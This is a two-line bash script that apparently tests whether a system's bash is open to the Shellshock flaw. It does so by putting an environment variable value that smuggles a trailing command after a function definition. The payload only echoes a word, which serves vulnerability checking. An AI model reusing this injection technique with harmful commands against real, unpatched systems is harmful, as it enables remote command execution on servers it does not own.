#!/bin/bash
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"